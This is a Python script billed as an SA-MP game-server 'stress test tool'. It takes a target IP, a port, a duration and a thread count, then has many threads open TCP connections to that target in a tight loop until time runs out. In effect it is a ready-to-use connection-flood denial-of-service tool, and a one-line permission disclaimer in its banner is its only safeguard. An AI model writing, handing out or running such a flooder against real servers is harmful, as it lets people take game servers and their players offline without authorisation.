import socket
import threading
import time

# Decorative Banner
def print_banner():
    print("="*50)
    print("      SA-MP SERVER STRESS TEST TOOL")
    print("="*50)
    print("Disclaimer: Use only on servers/networks you own or have permission to test.")
    print("="*50)

# SA-MP Stress Test Function (TCP)
def samp_stress_test(ip, port, duration):
    timeout = time.time() + duration
    
    while time.time() < timeout:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((ip, port))
            print(f"[SA-MP] Connection request sent to {ip}:{port}")
            sock.close()
        except Exception as e:
            print(f"[SA-MP] Failed to connect to {ip}:{port}: {e}")
            sock.close()

    print(f"\n[SA-MP] Completed stress test on {ip}:{port} for {duration} seconds.")

if __name__ == "__main__":
    print_banner()

    # User Input
    target_ip = input("Enter the SA-MP server IP address: ")
    target_port = int(input("Enter the server port number (default is 7777): "))
    duration = int(input("Enter the duration of the test in seconds: "))
    thread_count = int(input("Enter the number of threads to simulate: "))

    threads = []

    print("\n" + "="*50)
    print(f"Starting SA-MP stress test on {target_ip}:{target_port} for {duration} seconds.")
    print("="*50 + "\n")

    for i in range(thread_count):
        thread = threading.Thread(target=samp_stress_test, args=(target_ip, target_port, duration))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("\n" + "="*50)
    print(f"Stress test on {target_ip}:{target_port} completed.")
    print("="*50)
